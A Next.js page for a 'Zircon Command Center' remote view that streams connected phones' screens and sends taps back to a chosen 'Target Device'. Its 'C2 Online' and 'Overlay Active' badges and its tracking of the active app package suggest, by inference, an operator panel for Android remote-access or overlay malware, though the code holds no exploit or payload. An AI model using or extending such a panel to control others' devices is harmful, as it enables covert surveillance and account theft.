"use client";

import Link from "next/link";
import { useOverlayServer } from "@/hooks/useOverlayServer";
import { useStreamServer } from "@/hooks/useStreamServer";
import { StreamPlayer } from "@/components/ui/StreamPlayer";
import { StatusBadge } from "@/components/ui/StatusBadge";
import { TerminalSquare, Smartphone, Server, Layers, ChevronDown } from "lucide-react";
import { useState, useEffect, useMemo } from "react";

export default function RemotePage() {
  const [wsUrl, setWsUrl] = useState<string>("");
  const [mediaHost, setMediaHost] = useState<string>("");

  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const isDev = window.location.port === "3001";
    const host = isDev ? `${window.location.hostname}:3000` : window.location.host;
    setWsUrl(`${protocol}//${host}`);
    setMediaHost(`${window.location.hostname}:8000`);
  }, []);

  const { state: overlayState, sendTap } = useOverlayServer(wsUrl);
  const { streams } = useStreamServer(wsUrl);

  const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(null);

  const streamsWithUrls = useMemo(() => {
    return streams.map((s) => ({
      ...s,
      flvUrl: `http://${mediaHost}${s.streamPath}.flv`,
    }));
  }, [streams, mediaHost]);

  const activeStream = useMemo(() => {
    if (!selectedDeviceId) return null;
    return streamsWithUrls.find(s => s.streamPath === `/live/${selectedDeviceId}`);
  }, [streamsWithUrls, selectedDeviceId]);

  const activeDevice = useMemo(() => {
    if (!selectedDeviceId) return null;
    return overlayState.devices.find(d => d.id === selectedDeviceId);
  }, [overlayState.devices, selectedDeviceId]);

  useEffect(() => {
    if (overlayState.devices.length > 0 && !selectedDeviceId) {
      setSelectedDeviceId(overlayState.devices[0].id);
    } else if (overlayState.devices.length === 0 && selectedDeviceId) {
      setSelectedDeviceId(null);
    }
  }, [overlayState.devices, selectedDeviceId]);

  // Extract taps from event log for visualizer
  const remoteTaps = useMemo(() => {
    if (!selectedDeviceId) return [];
    return overlayState.events
      .filter(e => e.type === "tap_event" && e.deviceId === selectedDeviceId && e.x !== undefined && e.y !== undefined)
      .map(e => ({ x: e.x!, y: e.y!, ts: e.ts || Date.now() }))
      .slice(0, 5); // Only show latest few to avoid clutter
  }, [overlayState.events, selectedDeviceId]);

  return (
    <div className="flex h-screen flex-col overflow-hidden bg-neutral-950 font-sans text-white selection:bg-white/20">
      {/* Header */}
      <header className="relative z-10 flex h-16 shrink-0 items-center gap-4 border-b border-white/10 bg-black/40 px-6 backdrop-blur-xl">
        <div className="flex items-center gap-3">
          <div className="flex h-8 w-8 items-center justify-center rounded-lg bg-white/10 text-white shadow-inner">
            <TerminalSquare size={18} />
          </div>
          <h1 className="text-sm font-semibold tracking-wide">Zircon Command Center</h1>
        </div>

        <nav className="flex items-center gap-6 ml-8 mt-1.5 h-full">
          <Link href="/" className="text-sm font-medium text-neutral-400 hover:text-white transition-colors pb-4 pt-1 border-b-2 border-transparent">
            Dashboard
          </Link>
          <Link href="/remote" className="text-sm font-medium text-white border-b-2 border-white pb-4 pt-1">
            Remote (Exp)
          </Link>
        </nav>

        <div className="flex-1" />

        {/* Device Dropdown */}
        <div className="flex items-center gap-2 mr-4">
          <label className="text-[10px] uppercase tracking-wider text-neutral-500 font-bold hidden sm:block">Target Device</label>
          <div className="relative">
            <select
              value={selectedDeviceId || ""}
              onChange={(e) => setSelectedDeviceId(e.target.value)}
              className="appearance-none bg-white/5 border border-white/10 rounded-lg pl-3 pr-8 py-1.5 text-sm font-medium text-white focus:outline-none focus:ring-2 focus:ring-blue-500/50 hover:bg-white/10 transition-colors cursor-pointer min-w-[200px] truncate"
            >
              {overlayState.devices.length === 0 && (
                <option value="" disabled className="bg-neutral-900">No devices connected</option>
              )}
              {overlayState.devices.map(d => (
                <option key={d.id} value={d.id} className="bg-neutral-900 text-white">
                  {d.manufacturer} {d.model} ({d.id.replace('device_', '')})
                </option>
              ))}
            </select>
            <ChevronDown size={14} className="absolute right-2.5 top-1/2 -translate-y-1/2 text-neutral-400 pointer-events-none" />
          </div>
        </div>

        <div className="flex items-center gap-3">
          <StatusBadge
            status={overlayState.devices.length > 0}
            label={overlayState.devices.length > 0 ? `${overlayState.devices.length} Device${overlayState.devices.length > 1 ? 's' : ''}` : "No Device"}
            icon={<Smartphone size={14} />}
          />
          <StatusBadge
            status={overlayState.wsConnected}
            label={overlayState.wsConnected ? "C2 Online" : "C2 Offline"}
            icon={<Server size={14} />}
          />
          <StatusBadge
            status={overlayState.uptime > 0}
            label={overlayState.activeWindow.package !== "—" ? "Overlay Active" : "Waiting..."}
            icon={<Layers size={14} />}
          />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 p-6 flex flex-col items-center justify-center bg-[radial-gradient(ellipse_at_center,_var(--tw-gradient-stops))] from-blue-900/10 via-neutral-950 to-neutral-950">
        
        {!activeDevice ? (
          <div className="flex flex-col items-center text-neutral-500">
            <Smartphone size={48} className="mb-4 opacity-20" />
            <p>Connect a device to start remote access</p>
          </div>
        ) : !activeStream ? (
          <div className="flex flex-col items-center text-neutral-500">
            <TerminalSquare size={48} className="mb-4 opacity-20" />
            <p>Waiting for RTMP stream from {activeDevice.model}...</p>
          </div>
        ) : (
          <div className="w-full max-w-4xl aspect-[9/19] sm:aspect-[9/16] relative max-h-[85vh]">
            <StreamPlayer
              streamUrl={activeStream.flvUrl}
              streamName={activeStream.name}
              isLive={true}
              startedAt={activeStream.startedAt}
              clientIp={activeStream.clientIp}
              deviceWidth={activeDevice.screenWidth}
              deviceHeight={activeDevice.screenHeight}
              remoteTaps={remoteTaps}
              onVideoClick={(x, y) => {
                if (selectedDeviceId) {
                  sendTap(selectedDeviceId, x, y);
                }
              }}
            />
            {(!activeDevice.screenWidth || !activeDevice.screenHeight) && (
              <div className="absolute inset-x-0 bottom-16 flex justify-center z-40 pointer-events-none">
                <div className="bg-red-500/90 text-white text-xs px-4 py-2 rounded-full font-medium shadow-xl">
                  Warning: Device resolution not received. Touches will not map correctly.
                </div>
              </div>
            )}
          </div>
        )}
      </main>
    </div>
  );
}
